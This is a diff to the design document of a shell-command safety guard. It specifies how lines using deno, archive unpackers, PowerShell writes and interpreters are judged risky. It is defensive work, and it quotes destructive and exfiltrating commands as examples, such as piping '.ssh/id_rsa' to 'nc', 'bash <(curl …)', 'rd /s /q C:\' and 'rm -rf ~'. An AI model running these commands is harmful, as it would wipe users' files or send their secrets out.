@@ -381,7 +381,20 @@ file`, so a script the same line writes is not read, also after options (`bun
 file.py`, and `uv run --script file`: `uv` runs Python on the file, like
 `python file`. `deno run npm:pkg` runs the package's program like a runner,
 and so do `deno watch npm:pkg` and `deno npm:pkg`: deno's default subcommand
-is `run`. `deno x` and `dx` are package runners, like `bun x`. In cmd lines
+is `run`. A script deno fetches from the network, a URL of `http:` or
+`https:` (its scheme in any case) or a package of the `jsr:` registry, is
+code no line shows: `deno run https://…`, `deno https://…`, `deno watch
+https://…` and `deno run -A jsr:@x/y` are `run_downloaded`, in every shell.
+An npm package is judged by the program it runs, as `npx` judges one. A
+script or a subcommand only known when it runs (`deno run $F`, `bun $F`) is
+`unknown`. `deno serve` runs its module as `deno run` does, and `deno test`
+and `deno bench` every module they are given; a module deno loads before
+the script (`--preload`, `--import`, `--require`, the files of `deno repl
+--eval-file`) is judged the same, and so is an import map it fetches
+(`--import-map https://…`), which may point any import anywhere. Code in a
+`data:` URL (`deno run 'data:application/javascript,…'`, `--preload
+data:…`) is on the line and not read: `unknown`, `runs an encoded script
+that cannot be read`. `deno x` and `dx` are package runners, like `bun x`. In cmd lines
 `bun`, `deno` and `dx` are read as in the other shells (`bun x rimraf C:\`,
 `bun run rimraf C:\`, `deno run npm:rimraf C:\`, `dx rimraf C:\`, and the
 POSIX script of `bun exec "rm -rf ~"`), but a script from the input that
@@ -616,6 +629,7 @@ that finds the edge by measuring it and asserts both sides (see Tests):
 | What the grammars' lexers read for a line | 4 MiB, and 32 times the text parsed | the lexer is handed the text 256 bytes at a time and asks again past each piece and whenever it goes back, so what it reads is counted to within a piece, without a clock; past the budget the parse is stopped and the line is `unreadable`, `takes too long to read`. The budget is the line's, shared by its nested scripts and inline code. A line people write is read once or twice over; a few real shapes a few hundred times over a short text (cmd's chain of 400 commands, its brackets 400 deep, a here-document after a long group), under a megabyte; the noise below reads gigabytes. No edge is measured for it, since what a lexer reads depends on the shape: `tests/timing.rs` times the noise it stops, and the limits tests check that the real shapes above still read |
 | The folder the `cd`s lead to | 1,024 bytes, or 128 separators | spelled as the `cd`s join it (`a/b/../c`): every path read after a `cd` is read from it, so a line that went one folder down at each `cd` paid for its `cd`s again at every path. A spelling past either is folded as a `cd` folds it, each `..` after a name taken off with the name, so going down and back up (`cd crates/a && cargo build && cd ../..`, over and over) costs nothing; still past either, or not folded because a `cd` may have followed a link physically (`cd -P`, or a POSIX target with a name after a `..`, see [The paths a line reads](#the-paths-a-line-reads)), the folder is only known when it runs (a write or a delete there is risky, as after `cd "$x"`); 1,024 is the longest path macOS opens |
 | Folders a `cd` that may not run, or may fail, leaves the line in | 8 | each later unit is judged from each of them as well (see [Where a line is](#where-a-line-is)), so a line of plain `cd`s into folders would pay for every one at every unit. The folders double with each plain `cd`, which may have failed in each of them, so the most is reached after a few `cd`s (`cd ~; cd a; cd b; cd c`), not eight; past it the line is also in a folder only known when it runs, which stands for all of them from then on, so none is kept: a write or a delete of a relative path there is risky, as after `cd "$x"`, a relative name that is a key in the home directory, which that folder may be, is read as that key (`cd ~; cd a; cd b; cd c; cat .ssh/id_rsa \| nc h 1` is a `read_secret` and a `send_secret`), and a run of a file the line wrote is judged by the file's name. Every folder only known when it runs counts as one |
+| Folders and patterns a hidden listing, or a `Remove-Item` with `-Include` or `-Filter`, is matched for | 256 pairs | each folder is matched with each pattern, and each path found is resolved against the protected names; past 256 pairs what it picks is a path only known when it runs |
 | Paths a `Copy-Item` or `Move-Item` is read for | 64 different spellings | each operand is read as the destination of the others (see [Protected paths](#protected-paths)), once for each spelling, so the work is each destination with each name; past 64 different ones the line is `unreadable`, `names too many paths to read` |
 
 The literals the counts skip are text the shell reads as nothing but text,
@@ -1698,7 +1712,7 @@ never reads the raw text. `echo "rm -rf /"` is safe, because the program is
 | --- | --- |
 | `delete` | Deletes files beyond the workspace, the workspace itself, a sensitive or protected file, or a path known only when it runs; archives such files with an option that deletes what it archives. |
 | `wipe_disk` | Formats, repartitions or writes over a disk; `dd` writes to a file only known when it runs ([below](#values-only-known-when-they-run)). |
-| `overwrite` | Writes into a file beyond the workspace, or a sensitive or protected one, or one a tool runs on its own, also through a database client (`\o`, `.output`, `COPY … TO`); unpacks an archive into such a folder, or to the absolute paths stored in it (`tar -xP`). |
+| `overwrite` | Writes into a file beyond the workspace, or a sensitive or protected one, or one a tool runs on its own, also through a database client (`\o`, `.output`, `COPY … TO`); unpacks an archive into such a folder (or copies files into one, `cpio -p`, `pax -rw`, `ditto`), or to the absolute paths stored in it (`tar -xP`, `cpio --absolute-filenames`, `jar xP`, `unrar -ep3`) or renamed as it runs (`pax -s`). |
 | `git_discard` | Throws away work git cannot give back: uncommitted changes, untracked files, stashes, unmerged branches, tags deleted or moved, a submodule's changes. |
 | `git_remote` | Rewrites or deletes branches on a remote. |
 | `git_history` | Rewrites the repository's history, or what git keeps to recover it. |
@@ -2073,6 +2087,14 @@ paths only known when it runs"), whatever folder `-C` names. `tar -cPf`,
 | `unzip` | `-d dir`, `-ddir`, inside a bundle (`-qod dir`) | `-l`, `-v`, `-t`, `-Z`, `-p`, `-c`, `-z` |
 | `7z`, `7za`, `7zr`, `7zz` | `-oDIR` (every one given); `x` and `e` only | any other command (`l`, `a`, `t`) |
 | `Expand-Archive` | `-DestinationPath`, or the second positional argument (the first when `-Path` or `-LiteralPath` is named) | |
+| `cpio`, `gcpio`, `bsdcpio` | copy-in (`-i`, `--extract`): `-D dir`, `-Ddir`, `--directory=dir` (every one given); pass-through (`-p`, `--pass-through`) copies into its first operand, under `-D` | `-t`/`--list`, `-o`/`--create`, `--to-stdout`, `--only-verify-crc` |
+| `ditto` | `-x`: the last operand, after the archives; with neither `-x` nor `-c`, `ditto` copies into its last operand (`copies into …`), as `cp` copies into its destination | `-c` |
+| `pax` | `-r`: the working directory; `-r -w` copies into the last operand | `-w` alone, neither (a listing) |
+| `unrar`, `rar`, `WinRAR.exe` | `x` and `e` (any case): an operand after the archive's name that ends with `/` or `\`; any other, which may be a folder that exists; `-op<dir>`; the working directory when no operand ends with a separator and no `-op` is given | any other command (`l`, `t`, `p`, `a`) |
+| `unar` | `-o dir`, `-output-directory dir` (one dash or two); the working directory without one; the word after a word only known when it runs that may be `-o` | `-o -` (to the screen) |
+| `jar` | `x`, `-x`, `--extract`: the working directory, and `-C dir`, `--dir dir`, `--dir=dir`, which a JDK from 21 on unpacks into instead | `c`, `t`, `u`, `i`, `--list`, `--describe-module`, `--validate` |
+| `python -m zipfile`, `python -m tarfile` (any Python of the interpreter table) | `-e ARCHIVE DIR` (`--extract`, any prefix of it): every word after the archive; `tarfile` with no `DIR`, or with the archive attached to the option (`--extract=a.tar`, `-ea.tar`), unpacks into the working directory, and a word after an attached archive, which `argparse` refuses, is judged too; a single-dash word is a bundle of letters, as `argparse` reads it, so `-ve` is `-v -e` | `-l`, `-c`, `-t` (also in a bundle, `-vl`) |
+| .NET `ExtractToDirectory`, `ExtractToFile` (PowerShell) | the second argument of a static call, made with `::` (`[IO.Compression.ZipFile]::ExtractToDirectory('x.zip', $HOME)`, `ZipFileExtensions`, `[Formats.Tar.TarFile]`, a type held in a variable, `$t::ExtractToDirectory(…)`, or in parentheses), the first of one called on an archive or an entry with `.` (`$zip.ExtractToDirectory(dir)`, `$entry.ExtractToFile(path)`), both of the first two when the operator cannot be read; judged as `Expand-Archive -DestinationPath` of the folder, `Out-File -FilePath` of the file | |
 
 `tar` takes a long option written as a unique prefix, which the guard reads
 for the modes and `--to-stdout` as well as `--directory`. A mode is read from
@@ -2084,9 +2106,60 @@ whose mode is only known when it runs (`tar "$mode" -f x.tar -C ~`, `tar $mode
 -C ~`) is judged as if it extracted, unless a mode letter or long mode is
 read: `tar -czf "$out" -C ~ .` writes no folder, as `-c` is read.
 
+`tar --cd dir` (bsdtar's spelling, also `--cd=dir`) is `-C dir`. `-H` and
+`-L` take a value in GNU tar (a format, a tape length) and none in bsdtar
+(they follow links). The reading is cautious: when the word after the letter,
+or the rest of its bundle, is an option or holds a `C`, which no format or
+length is, it is read as bsdtar reads it, so `tar -xf x.tar -H -C /etc`,
+`tar -xf x.tar -L -C /etc` and `tar -xf x.tar -HC /etc` are judged into
+`/etc`, and `tar -xf x.tar -H ustar -C build` stays safe. No tar unpacks such
+a line: GNU tar refuses a format or a length that is an option, and bsdtar
+refuses `-H` and `-L` with `-x`. The old-style bundle (`tar xHf x.tar -C
+/etc`) is read the GNU way, which both tars refuse too.
+
+The other unpackers read their folder as `tar` does, with these choices:
+
+- A mode only known when it runs may be the one that unpacks: `cpio "$mode"
+  -D ~`, `jar "$mode" a.jar` (from the home directory), `pax "$mode"` (into
+  the working directory, and into the last operand when there are two), and a
+  `python -m zipfile` or `tarfile` line with no mode read but one only known
+  when it runs, which unpacks into a folder only known then. `ditto` with an
+  argument only known when it runs and no `-c` unpacks into its last operand.
+  In `unar`, a word only known when it runs that may be `-o` takes the word
+  after it as the folder (`unar "$o" ~ a.zip`), and one that may split into
+  words (`unar $OPTS a.zip`) may hold `-o` and a folder only known when it
+  runs.
+- `unrar` and `rar` take an operand as the folder when it ends with a
+  separator, or when it names a folder that exists, which the line does not
+  show: every operand after the archive's name (but `@list` files) is judged
+  as a folder, so `unrar x a.rar notes.txt ~/` and `unrar x a.rar ~` unpack
+  into the home directory, and `unrar x a.rar build/` is safe. A switch only
+  known when it runs that may be `-op` names a folder only known when it
+  runs.
+- `jar x` with `-C` is judged into both the working directory and the folder
+  `-C` names: a JDK before 21 unpacks into the working directory whatever `-C`
+  says.
+- The stored paths are kept as they are, so they land anywhere ("unpacks to
+  absolute paths only known when it runs"), with `cpio --absolute-filenames`
+  (GNU) or `--insecure` (bsdcpio), `jar` with `P` (`jar xPf`), `unrar -ep3`
+  and `python -m tarfile --filter fully_trusted` (or a filter only known when
+  it runs). `pax -s` renames each stored path by a rule that only meets the
+  names when it runs: "unpacks to paths only known when it runs" (`copies to
+  …` with `-rw`).
+- GNU cpio without `--no-absolute-filenames`, `pax`, and Python's `tarfile`
+  before 3.14 without `--filter` also keep a stored absolute path. As for
+  every other archive, the stored paths are not in the line and are not read:
+  `cpio -idm < a.cpio` is safe in the workspace. A cautious choice would make
+  every such line `overwrite`; it is not taken.
+- `cpio -o`, `ditto -c`, `pax -w` and `jar c` write an archive, which this
+  rule does not judge. Plain `ditto src dst` copies `src` into `dst`, which
+  is judged as the destination of `cp`: `ditto src ~` copies into the home
+  directory.
+
 The reasons say `unpacks into your home directory`, `unpacks into a folder
-outside the workspace`, `unpacks into a folder only known when it runs`. A
-folder that is the workspace, inside it or a temporary file is not risky.
+outside the workspace`, `unpacks into a folder only known when it runs`
+(`copies into …` for `cpio -p`, `pax -rw` and plain `ditto`). A folder that is the
+workspace, inside it or a temporary file is not risky.
 
 ### Archiving that removes what it archives
 
@@ -2860,6 +2933,82 @@ a path.
   and `-Recurse -Include *.tmp | Remove-Item` without `-Force`.
   `-Depth` and `-Attributes` take a value, which is never read as the path.
   A common parameter's value (`-ErrorAction 0`) is never read as the path.
+- **A PowerShell write reads its paths as the cmdlet binds them.**
+  `Set-Content`, `Add-Content`, `Clear-Content`, `Out-File`, `Tee-Object`,
+  `New-Item` and `Set-Acl` are read by their own parameters: a prefix is
+  looked up among the cmdlet's names, so `Set-Content -Fil x ~\.bashrc` is
+  `-Filter x` (it has no `-FilePath`) and writes `~\.bashrc`; a name that is
+  none of the cmdlet's may take a value or not, so every positional is then
+  judged. A comma list is one argument, and the walk keeps which words go on
+  the list of the one before, so every item of a list given to `-Path`,
+  `-LiteralPath`, `-FilePath` or the first position is judged (`Set-Content
+  x,~\.bashrc x`, `Clear-Content src\a,C:\Windows\x`, `Set-Acl
+  x,C:\Windows $a`), and a list given to another parameter (`-Value x,y`,
+  `-Include *.tmp,*.log`) is that parameter's, not a path: `Set-Content
+  -Value x,y ~\.bashrc` writes `~\.bashrc`, and `Set-Content a.txt,b.txt x`
+  stays safe. A comma after a space is the start of the grammar's next word
+  (`,~`), but it puts that word on the list of the argument before, or
+  starts a list of one, and is not part of it: `Remove-Item x ,~ -Recurse`
+  deletes your home directory, as `Remove-Item ,~ -Recurse` does; a word
+  after such a comma that is anything but plain text (`,'~'`, `,$h`) is
+  only known when it runs. `--` ends the parameters: the words after it are positionals,
+  and `--` is no path (`Set-Content -- C:\Windows\x.dll x`, `'x' | Out-File
+  -- C:\Windows\x`, `Start-Process -- cmd "/c rd /s /q C:\"`). A splat
+  (`@p`) may bind the path, so it is a path only known when it runs:
+  `Set-Content x @p` is `overwrite`, even when the line sets `$p` to a table
+  it shows. With no path, `Set-Content`, `Add-Content`, `Clear-Content`,
+  `New-Item`, `Set-Acl` (whose `-InputObject` is the item itself, as a path
+  is) and the `-ItemProperty` cmdlets work on what the
+  stage before hands on, as the item cmdlets do (`Get-Item ~\.bashrc |
+  Clear-Content`, `Get-ChildItem -File ~ | Clear-Content`, `Get-Item HKCU:\x
+  | Set-ItemProperty -Name a -Value b`); `Get-ChildItem | Clear-Content`
+  works inside the workspace and stays safe, and `Get-Item src\a.txt |
+  Set-ItemProperty -Name IsReadOnly -Value $true` too; `Rename-ItemProperty`'s
+  `-NewName` takes a value, so it is never read as the path. `Out-File` and
+  `Tee-Object` take no path from the pipeline. `ForEach-Object` calling a
+  file's `CopyTo` or `MoveTo` by name writes to the file its argument names
+  (`Get-ChildItem | % CopyTo C:\x`, and `-Args`, the other name of
+  `-ArgumentList`, is read by the cmdlet's own parameters), and `Open` or `OpenWrite` may write each
+  item it is handed (`Get-ChildItem ~ | % Open Truncate`); `Delete` and
+  `MoveTo` are `delete` wherever they are called. `Copy-Item` and `Move-Item`
+  with no destination, by name or by position, copy into the folder the line
+  is in: `cd C:\Windows\System32; Copy-Item C:\x\evil.dll` writes to a
+  system folder, while `Copy-Item C:\x\a.txt` from the workspace stays safe.
+  A list is one position, the sources, so its last item is no destination
+  (`cd C:\Windows; Copy-Item a.dll,b.dll` copies both into a system folder);
+  cmd's `copy` and `xcopy` given one operand copy into the folder the line
+  is in too. `New-Item -ItemType SymbolicLink`, `Junction` or `HardLink`
+  (`-Type` too), or a type only known when it runs, links to its `-Value`,
+  or `-Target`, its other name, read as `mklink`'s target is: `New-Item
+  -ItemType Junction -Path j -Target C:\Windows` links to a system folder,
+  and `-Target .\src` stays safe. With no `-Value`, a link's target is what
+  the stage before hands on (`Get-Item C:\Windows | New-Item -ItemType
+  Junction -Path j`). `-Name` is one name: a list given to it is joined into
+  one, as PowerShell makes a list into text (`-Name a,b` is `a b`), and
+  every path with that name is the item; when that is more text than a line
+  holds, the item is a path only known when it runs.
+- **A stage that only narrows hands on what the stage before lists.**
+  `Where-Object`, `Sort-Object`, a `Select-Object` that only picks (no
+  `-ExpandProperty` and no calculated property, read as for stopping
+  processes) and `Get-Unique` hand on some of the objects they are handed,
+  unchanged, so a cmdlet after them works on what the stage before them
+  lists: `Get-ChildItem *.log | Where-Object { $_.Length -gt 0 } |
+  Remove-Item` deletes in the workspace and is safe, and `Get-ChildItem
+  C:\Windows | Where-Object { ... } | Remove-Item` and `Get-ChildItem -Force |
+  Where-Object Name -eq .git | Remove-Item -Recurse -Force` are `delete`. Any
+  other stage between hands on what only it knows. The stage each one reads
+  is worked out once for the line.
+- **`Remove-Item`'s own `-Include` and `-Filter` narrow a wildcard.** A path
+  whose last part holds a wildcard (`*`, `.\*`, `src\*`) deletes only what
+  the patterns pick in that folder, so `Remove-Item * -Include *.tmp
+  -Recurse` deletes `*.tmp`, not the whole workspace. Each pattern is read in
+  the folder as a hidden listing's filter is, so one that can match `.git`,
+  or with `-Recurse` a name `.git` holds, still takes it (`Remove-Item *
+  -Include .git -Recurse -Force`, `-Include config -Recurse -Force`), and a
+  pattern only known when it runs is a path only known then. A path whose
+  last part holds no wildcard, or that ends in a drive or a provider (`C:*`,
+  `FileSystem::*`), is judged as written, and so is every path with no
+  pattern: `Remove-Item * -Recurse` deletes the whole workspace.
 - A drive-relative path (`C:x`, `C:*`: a letter, a colon, and no separator) is
   from that drive's own working directory, and so is a bare `C:`. In
   PowerShell, on the drive the working directory is on, it is relative to it;
@@ -3109,8 +3258,15 @@ questions are answered apart:
 **Read whole.** A line with inline code is safe only when all four hold:
 
 1. **The code is written whole on the line**, as the one word after its flag:
-   `python -c CODE` (`python3`, `python3.12`, `python2`), `node -e CODE`
-   (`nodejs`; also `-p`, `--eval`, `--print`), `bun` the same, `deno eval CODE`.
+   `python -c CODE` (`python3`, `python3.12`, `python2`, `pypy`, `pypy3`,
+   `pypy3.10`, `graalpy`, `micropython`, and the launcher `py`, also past the
+   word that picks its Python: `py -3 -c CODE`, where PowerShell's number
+   `-3` is the same word), `node -e CODE` (`nodejs`; also `-p`, `--eval`, `--print`), `bun` the
+   same, `deno eval CODE`. `ipython` (`ipython3`), `tsx` and `ts-node` (and
+   its other programs: `ts-node-esm`, `ts-node-script`, `ts-node-cwd`,
+   `ts-node-transpile-only`, `ts-script`) are never read whole:
+   IPython runs the startup files of its profile first, and the TypeScript
+   runners read a `tsconfig.json`, which can name modules to load.
    Code handed by a here-document, a here-string, a pipe or a redirect
    (`python3 -`, `python3 - <<'PY'`, `node <<< 'code'`, `bun -`, `deno run -`,
    `python3 /dev/stdin`) is never read whole.
@@ -3157,7 +3313,9 @@ questions are answered apart:
    list (Python imports only the modules built into the interpreter binary,
    plainly: `sys`, `errno`, `itertools` and `time` (only `sys` and `errno`
    for `python2` and `python`, which may be Python 2, where `time` and
-   `itertools` are files and `builtins` is `__builtin__`), which the
+   `itertools` are files and `builtins` is `__builtin__`, and the same for
+   `pypy`, `pypy3` and a `py` whose first word does not pick Python 3, whose
+   built-in modules are not known to be those of `python3`), which the
    import system finds before it looks in the folder the code runs in, so
    nothing there can stand in for them; any other import, `json`, `re` and
    `math` among them, is looked up in that folder first and makes the code not
@@ -3227,17 +3385,92 @@ judged from every directory the code may be in, and is only known when it runs
 when they cannot be told.
 
 **Where the code comes from.** `python`, `python3` (and `python3.12`),
-`python2`: `-c`, also in a bundle (`-Sc`) or attached (`-cCODE`). `node`,
-`nodejs`: `-e`, `-p`, `--eval`, `--print`; `bun` the same, and `--cwd DIR`;
+`python2`, `pypy`, `pypy3`, `ipython`, and `py` past the word that picks its
+Python (`-3`, `-3.12`, `-3.12-64`, `-V:3.12`): `-c`, also in a bundle (`-Sc`)
+or attached (`-cCODE`). `node`, `nodejs`, `tsx`, `ts-node` (their TypeScript
+read with the JavaScript grammar, so what it does not parse is not read):
+`-e`, `-p`, `--eval`, `--print`; `bun` the same, and `--cwd DIR`;
 `deno eval`; every piece of code of several `-e` is read, not the first. A
 here-document or here-string of plain text (a quoted delimiter, or one with
 nothing in the body the shell would expand) handed to `python3`, `python3 -`,
 `node`, `node -`, `bun -`, `bun run -`, `deno run -` is read as code. All of
 these are read for what they find, and none but the first kind, written whole
 with no option or environment, is read whole. An `-i` (`python3 -i -c`,
-`node -i -e`) makes the interpreter go on to read code from its input, which is
-`unknown`, as a bare `python3` or `node` is. A script file (`python3
+`node -i -e`, and after a script: `python3 -i x.py`, `node -i build.js`)
+makes the interpreter go on to read code from its input, which is
+`unknown`, as a bare `python3` or `node` is, and a here-document handed to it
+is read as its code. A script file (`python3
 scripts/gen.py`, `node build.js`) is the workspace's own code and is not read.
+
+**Where the script is.** Each interpreter's options are read with its own
+table of the options that take a value, so the word after one is its value
+and never the script: python's `-W`, `-X`, `-Q` and
+`--check-hash-based-pycs`; perl's `-I`, `-M`, `-m` (and `-i`, `-0`, `-l`,
+`-x`, `-d`, `-D`, `-C`, `-F`, `-V`, which take only the rest of their own
+word); ruby's `-I`, `-r`, `-C`, `-E`, `-K` and `--enable`, `--disable`,
+`--encoding`, `--external-encoding`, `--internal-encoding`, `--dump`,
+`--backtrace-limit`, `--crash-report`, `--parser`; php's `-c`, `-d`, `-z`,
+`-t`, `-B`, `-E`, `-S` and their long names, with `-f FILE` and `--file FILE`
+the script; lua's `-l`; node's (and `tsx`'s and `ts-node`'s) `-r`, `-C` and
+the long options its documentation lists with a value (`--require`,
+`--import`, `--loader`, `--title`, `--env-file` and the rest), and
+`ts-node`'s `-P`, `-O`, `-C`, `-I`, `-D`. So `perl -I lib <<'PL'` and `ruby -r
+json <<'RB'` have no script: they read their code from the here-document, and
+are `unknown`; `python3 -W ignore <<'PY'` and `node -r dotenv/config <<'JS'`
+have theirs read. Node hands any option it does not know to V8, whose options
+with a value take the next word too, so a long option the table does not
+know, with no `=`, right before the script makes that word maybe its value:
+with an input handed to node (`node --max-old-space-size 4096 <<'JS'`), node
+may read its code from there, and the line is `unknown`. A word after `--` is
+the script, whatever it starts with (`python3 -- --version` runs a file of
+that name). A script only known when it runs (`python3 $F`, `python3 "$F"`,
+`node $(…)`, `python3 <(cat x.py)`, `deno run $F`, `bun $F`, `python %F%`)
+is `unknown`, `runs a script only known when it runs`, in every shell, and a
+process substitution whose commands download (`python3 <(curl -s …)`, also
+through a pipeline, `<(curl … | gunzip)`, and for a shell: `bash <(curl …)`,
+`source <(wget -qO- …)`) is `run_downloaded`, and so is one an
+interpreter or a shell reads from its input (`python3 < <(curl -s …)`,
+`bash < <(curl …)`). What `xargs` hands on is the
+files a listing names, and stays a script of the workspace's
+(`… | xargs python3`). The words after the script are its own arguments.
+
+**Modules that run what they are given.** `python -m MODULE` runs the module
+in place of a script, judged as a script is (`python3 -m pytest` is safe),
+but `timeit` runs the code it is given, `cProfile`, `profile` and `trace` run
+a script under them, and `pdb` and `code` read what to run from the input:
+the REPLs `asyncio`, `IPython`, `bpython` and `ptpython` read it from the
+input as `code` does: these are `unknown`, `runs code the guard does not
+read`, also attached (`-mtimeit`) and after other options. IPython's own
+options are its own table: it reads any `--Class.trait=value` as a setting,
+and some of those run code before the script
+(`--InteractiveShellApp.code_to_run`, `exec_lines`, `exec_files`, the
+extensions `--ext` loads), so a long option it has that the guard does not know as harmless (`--no-banner`,
+`--profile NAME` and the rest) makes `ipython x.py` `unknown` too. A module only known when it runs is
+`unknown`. `-m zipfile -e` and `-m tarfile -e` unpack (see
+[Unpacking archives](#unpacking-archives)).
+
+**Modules loaded before the program.** `NODE_OPTIONS` that load a module
+(`--require`, `-r`, `--import`, `--loader`, `--experimental-loader`, also
+with `=` or `_` for `-`) have every node the program starts load it first,
+code the line does not show (a `data:` URL included): in front of any program
+but a builtin that starts nothing (`echo`, `cd`, `export` and the others of
+`STARTS_NOTHING`) the line is `unknown`, `loads code through NODE_OPTIONS
+that the guard does not read`, wherever the value is set: a prefix
+assignment, `env`, an `export` or an assignment earlier in the line
+(`NODE_OPTIONS+=` adds to the value the line gave it), PowerShell's
+`$env:NODE_OPTIONS = …` (`Set-Item env:NODE_OPTIONS`,
+`[Environment]::SetEnvironmentVariable`) and cmd's `set NODE_OPTIONS=…`. The
+value is split as node's `ParseNodeOptionsEnvVar` splits it: at a space
+outside double quotes, a `"` turning quoting on and off, and inside quotes a
+backslash taking the next character as it is (`"--requ\ire"` is
+`--require`); a value node cannot split (a backslash at its end inside
+quotes, a quote left open) may hold anything. A value only known when it
+runs may load one. An `unset NODE_OPTIONS` is not read: it may not run, and
+the line stays `unknown`. `NODE_OPTIONS=--max-old-space-size=4096
+npm test` loads nothing and stays safe. A module node is told to load on its
+own line (`node -r ./setup.js main.js`) is the workspace's code as the script
+is, unless the line writes it (see
+[Reading more than one unit at a time](#reading-more-than-one-unit-at-a-time)).
 Neither is code from a pipe or another redirect (`cat x.py | python3`,
 `python3 < x.py`), which stays `unknown`, or `run_downloaded` after a download.
 Code that PowerShell or cmd hands to an interpreter stays `unknown`: its paths
@@ -3536,7 +3769,13 @@ A line is never safe because the guard gave up on it. These come back risky:
   `-EncodedCommand`.
 - Code handed to an interpreter that is not read: Ruby, Perl (beyond
   `perl -pi`), PHP and Lua, and any code piped into an interpreter, or read
-  from a file it is redirected from. Python and JavaScript given inline
+  from a file it is redirected from, or from a here-document after an option
+  that took the next word (`perl -I lib <<'PL'`). A script only known when it
+  runs (`python3 $F`, `node <(…)`), a module that runs what it is given
+  (`python3 -m timeit CODE`), and `NODE_OPTIONS` that load a module in front
+  of a program (see [Inline code](#inline-code)); a process substitution that
+  downloads, or a script deno fetches from the network, run as a script, is
+  `run_downloaded`. Python and JavaScript given inline
   (`python3 -c`, `node -e`, `bun -e`, `deno eval`) are read, and what they do
   is judged, but a line is safe only for code read whole: written whole on the
   line, with no option or environment around the interpreter, and made of
@@ -3751,6 +3990,15 @@ Some risks only show when units are read together.
   a script whose path cannot be placed (after a `cd` to somewhere unknown, or
   `bash C:x` after a `cd`) is `unknown`, since it may be the one the line wrote.
   A line that writes nothing has no such script.
+  A module node, `tsx` or `ts-node` loads before the script (`-r`,
+  `--require`, `--import`, `--loader`, `--experimental-loader`, before the
+  script) and one bun or deno loads (`--preload`, `-r`, `--require`,
+  `--import`) runs as the script does: `echo x > s.js && node -r ./s.js
+  main.js` is `unknown` as `node s.js` is. So does a library ruby's `-r` or
+  perl's `-M` (`-m`) loads, looked up in each `-I` folder with its extension
+  (`ruby -I . -r s` loads `./s.rb`, `perl -Ilib -MA::B` loads
+  `lib/A/B.pm`; ruby also takes a path, `-r ./s`), and a file php's `-d
+  auto_prepend_file=` or `auto_append_file=` names.
   A run is judged from every folder the line may be in when it runs: a `cd`
   that may not have run (in a branch, after `&&` or `||` or on the left of
   `||`, in a loop or a function body, in a pipeline stage of a POSIX shell or
@@ -3876,8 +4124,12 @@ Some risks only show when units are read together.
   `-LiteralPath` or `-FilePath`: `Set-Content i.ps1 x`, `Add-Content`,
   `'x' | Out-File i.ps1`, `Tee-Object`, `New-Item i.ps1 -Value x` (with
   `-Name`, the name inside the folder), and the aliases, and the destination
-  of `Copy-Item a b` and `Move-Item a b`. Each is a write of that file, so
-  `Set-Content i.ps1 x; .\i.ps1` is `unknown` as the `-Path` form is. The
+  of `Copy-Item a b` and `Move-Item a b` (with none, the folder the line is
+  in; a list is the sources, one position; with no path, what the stage
+  before hands on: what `Get-Item` names, or, for what a listing finds, any
+  file, so `Get-Item C:\x\e.ps1 | Copy-Item; .\e.ps1` is `unknown`). Each
+  is a write of that file, so `Set-Content i.ps1 x; .\i.ps1` is `unknown` as
+  the `-Path` form is. The
   parser hands a list of paths (`a.ps1,b.ps1`) over as separate words, which
   cannot be told from a file and its value, so every other operand the guard
   can read counts as a file too (`Set-Content notes.txt x.ps1; .\x.ps1` is
